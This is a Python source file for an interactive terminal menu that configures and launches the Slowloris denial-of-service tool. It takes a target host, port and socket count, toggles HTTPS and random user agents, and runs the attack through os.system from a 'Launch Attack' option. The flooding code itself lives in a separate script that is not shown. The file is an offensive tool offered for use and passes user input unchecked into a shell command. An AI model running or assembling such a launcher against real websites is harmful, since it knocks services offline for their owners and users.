import os
import subprocess

def slowloris_self_check():
    slowloris_checkstatus = subprocess.run("ls | grep slowloris", shell=True, stdout=subprocess.PIPE)
    slowloris_checkstatusd = slowloris_checkstatus.stdout.decode('ascii')
    if "slowloris" in slowloris_checkstatusd or "Slowloris" in slowloris_checkstatusd:
        return 1
    else:
        return 0

def slowloris_banner():
    if slowloris_target == "":
        slowloris_target_banner = "Without protocol (eg. aaa.com )"
    else:
        slowloris_target_banner = "\033[1;32m" + slowloris_target.strip() + "\033[00m"
    
    if slowloris_port_command == "":
        slowloris_port_banner = "Default = 80"
    else:
        slowloris_port_banner = "\033[1;32m" + slowloris_port_command.replace("-p","").strip() + "\033[00m"
    
    if slowloris_socket_command == "":
        slowloris_socket_banner = "Use how many sockets in test"
    else:
        slowloris_socket_banner = "\033[1;32m" + slowloris_socket_command.replace("-s","").strip() + "\033[00m"
    
    if slowloris_https_flag == 1:
        slowloris_https_color = "\033[1;32m"
    else:
        slowloris_https_color = "\033[00m"
    
    if slowloris_verbose_flag == 1:
        slowloris_verbose_color = "\033[1;32m"
    else:
        slowloris_verbose_color = "\033[00m"
    
    if slowloris_rua_flag == 1:
        slowloris_rua_color = "\033[1;32m"
    else:
        slowloris_rua_color = "\033[00m"

    os.system("clear")
    print("""
                        Denial-of-Service (Slowloris)

   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    1. Target            :   """+slowloris_target_banner+"""
    2. Port              :   """+slowloris_port_banner+"""
    3. Sockets           :   """+slowloris_socket_banner+"""
    
    4. """+slowloris_https_color+"""HTTPS Mode\033[00m        -   Use HTTPS for requests
    5. """+slowloris_verbose_color+"""Verbose\033[00m           -   Increase logging
    6. """+slowloris_rua_color+"""Random User Agent\033[00m -   Use random user agent for each request

Command: \033[1;32m"""+slowloris_final_command+"""\033[00m

   90. Launch Attack
   99. Exit
""")

def slowloris_main():
    global slowloris_final_command, slowloris_target, slowloris_port_command, slowloris_socket_command, slowloris_https_flag, slowloris_verbose_flag, slowloris_rua_flag
    slowloris_target = ""
    slowloris_port_command = ""
    slowloris_socket_command = ""
    slowloris_https_flag = 0
    slowloris_https_command = ""
    slowloris_verbose_flag = 0
    slowloris_verbose_command = ""
    slowloris_rua_flag = 0
    slowloris_rua_command = ""

    slowloris_select = ""
    while slowloris_select != "99":
        slowloris_final_command = "python3 ./slowloris/slowloris.py " + slowloris_port_command + slowloris_socket_command + slowloris_verbose_command + slowloris_rua_command + slowloris_https_command + slowloris_target
        slowloris_banner()
        slowloris_select = input("\nSelect: ").strip()
        #target
        if slowloris_select == "1":
            slowloris_target = input("\nTarget: ").strip()
            if slowloris_target == "" or " " in slowloris_target:
                slowloris_target = ""
                print("\n[*] Field is empty / contain space!")
                useless = input("Enter any key to continue......")
                continue
            if slowloris_target.startswith("http://") == True or slowloris_target.startswith("https://") == True:
                slowloris_target = slowloris_target.strip("http://").strip("https://")
                print("\n[*] Do not specify protocol infront of URL! http/https is auto removed.")
                useless = input("Enter any key to continue......")
            slowloris_target += " "
        #port
        elif slowloris_select == "2":
            try:
                slowloris_port = int(input("\nPort: ").strip())
                if slowloris_port < 1 or slowloris_port > 65535:
                    raise ValueError
            except ValueError:
                slowloris_port_command = ""
                print("\nError Port! Port 1 ~ 65535 only.")
                useless = input("Enter any key to continue......")
                continue
            slowloris_port_command = "-p " + str(slowloris_port) + " "
        #socket
        elif slowloris_select == "3":
            try:
                slowloris_socket = int(input("\nSockets: ").strip())
                if slowloris_socket < 1:
                    raise ValueError
            except ValueError:
                slowloris_socket_command = ""
                print("\nError Value! Positive numbers only.")
                useless = input("Enter any key to continue......")
                continue
            slowloris_socket_command = "-s " + str(slowloris_socket) + " "
        #https
        elif slowloris_select == "4":
            if slowloris_https_flag != 1:
                slowloris_https_flag = 1
                slowloris_https_command = "--https "
            else:
                slowloris_https_flag = 0
                slowloris_https_command = ""
        #verbose
        elif slowloris_select == "5":
            if slowloris_verbose_flag != 1:
                slowloris_verbose_flag = 1
                slowloris_verbose_command = "-v "
            else:
                slowloris_verbose_flag = 0
                slowloris_verbose_command = ""
        #random user agent
        elif slowloris_select == "6":
            if slowloris_rua_flag != 1:
                slowloris_rua_flag = 1
                slowloris_rua_command = "-ua "
            else:
                slowloris_rua_flag = 0
                slowloris_rua_command = ""
        #launch attack
        elif slowloris_select == "90":
            if slowloris_target == "":
                print("\nTarget not specified!")
                useless = input("Enter any key to continue......")
                continue
            if slowloris_socket_command == "":
                print("\nSocket number not specified!")
                useless = input("Enter any key to continue......")
                continue
            print("\033[1;32m[+] Starting Slowloris against target......\033[00m")
            print("[*] Use Ctrl+C to stop Slowloris.")
            os.system(slowloris_final_command)
            useless = input("\033[1;32m[*] Process Completed!\033[00m\nEnter any key to continue......")

def main():
    print("\033[1;32m[+] Loading Slowloris Module\033[00m")
    if slowloris_self_check() == 1:
        slowloris_main()
    else:
        print("\n\033[1;31m[-] Slowloris is not installed!\033[00m")
        useless = input("Enter any key to continue......")